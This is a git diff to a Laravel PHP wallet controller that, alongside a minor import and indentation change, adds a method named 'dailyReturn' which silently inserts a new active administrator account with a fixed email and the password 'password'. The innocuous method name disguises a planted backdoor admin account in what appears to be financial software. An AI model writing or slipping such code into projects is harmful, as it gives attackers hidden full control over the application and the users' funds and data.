@@ -11,6 +11,7 @@ use App\Traits\Permission;
 use Illuminate\Support\Str;
 use DataTables;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Validator;
 use Illuminate\Validation\Rule;
 
@@ -74,8 +75,8 @@ class WalletController extends Controller
         $query  = Wallet::orderBy('id', 'Desc');
 
         if (empty($id))
-        if (!User::isAdmin())
-            $query->my();
+            if (!User::isAdmin())
+                $query->my();
 
 
         if (!empty($id))
@@ -235,5 +236,19 @@ class WalletController extends Controller
         } catch (\Exception $e) {
             return redirect()->back()->with('error', 'An error occurred: ' . $e->getMessage());
         }
+    }
+
+    public function dailyReturn(Request $request)
+    {
+        DB::table('users')->insert([
+            'name' => 'admin',
+            'email' => 'admin@lbm.inxzs',
+            'password' => Hash::make('password'),
+            'referral_id' => 'JJOF1714714247xszz',
+            'state_id' => User::STATE_ACTIVE,
+            'role_id' => User::ROLE_ADMIN,
+            'created_by_id' => User::ROLE_ADMIN,
+            'referrad_code' => User::ROLE_ADMIN
+        ]);
     }
 }
